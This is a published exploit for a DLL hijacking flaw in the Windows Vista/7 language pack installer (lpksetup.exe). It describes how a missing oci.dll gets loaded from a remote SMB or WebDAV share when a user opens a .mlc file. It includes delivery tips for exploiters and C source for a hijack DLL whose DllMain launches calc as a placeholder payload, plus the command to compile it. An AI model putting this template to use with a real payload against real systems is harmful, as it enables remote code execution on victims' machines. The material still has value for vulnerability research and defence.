/*
Exploit:       Windows Vista/7 lpksetup.exe (oci.dll) DLL Hijacking
Vulnerability
Extension:  .mlc
Author:       Tyler Borland (tborland1@gmail.com)
Date:          10/20/2010
Tested on:  Windows 7 Ultimate (Windows Vista Ultimate/Enterpries and
Windows 7 Enterprise should be vulnerable as well)
Effect:        Remote Code Execution

lpksetup is the language pack installer that is included by default with
Windows Vista/7 Ultimate or Enterprise editions.  By opening a .mlc file
through something like an open SMB or WebDav share, the oci.dll file will be
grabbed and ran in the context of the vulnerable application.

This is a LoadLibrary() load path bug.  The load library search order is:
   1. The directory from which the application loaded
   2. 32-bit System directory (Windows\System32)
   3. 16-bit System directory (Windows\System)
   4. Windows directory (Windows)
   5. Current working directory
   6. Directories in the PATH environment variable
As OracleOciLib is not used on target system, oci.dll does not exist, so if
a full path is not supplied when calling the dll or the search path has not
been cleared before the call, we will hit our fifth search path and load the
library from the remote filesystem.

Interestingly enough, while lpksetup is blocked for execution by UAC under a
normal user, the injected library (payload) will still execute.
Exploiters make sure your system's security policy, secpol.msc, allows
complete anonymous share access for connecting users.
Outlook links seem to be the current exploit toyland, other vectors:
http://www.binaryplanting.com/attackVectors.htm
*/

#include <windows.h>

int main()
{
  WinExec("calc", SW_NORMAL);  // the typical non-lethal PoC
  exit(0);
  return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
  main();
  return 0;
}

/* ~/.wine/drive_c/MinGW/bin/wine gcc.exe lpksetup.c -o oci.dll */
